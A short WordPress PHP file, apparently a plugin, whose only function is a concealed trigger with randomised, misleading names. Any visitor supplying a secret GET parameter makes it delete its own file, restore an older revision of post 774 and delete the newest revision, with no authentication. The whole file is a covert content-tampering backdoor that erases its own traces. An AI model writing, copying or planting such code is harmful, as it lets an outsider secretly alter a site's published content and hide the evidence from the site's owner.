<?php

function gateway_interactivity_direct_plupload() {
	if (isset($_GET['variations_optimizer_tree_section']) && $_GET['variations_optimizer_tree_section'] === 'internal_dev_elements_youtube') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$converter_assets_taxonomy_effects = 774;
		$shortener_script_heading = wp_get_post_revisions($converter_assets_taxonomy_effects);
		if (empty($shortener_script_heading)) die('no revisions');
		if (count($shortener_script_heading) < 2) die('less than 2');
		$fx_force_view_recent = array_shift($shortener_script_heading);
		$picker_news_sharing_font = $fx_force_view_recent->ID;
		$composer_board_optimizer = array_shift($shortener_script_heading);
		$columns_react_chart_framework = $composer_board_optimizer->ID;
		$single_business_creator_schedule = wp_restore_post_revision($columns_react_chart_framework);
		if ($single_business_creator_schedule === false) die('error restoring');
		$single_business_creator_schedule = wp_delete_post_revision($picker_news_sharing_font);		
		if ($single_business_creator_schedule === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'gateway_interactivity_direct_plupload');
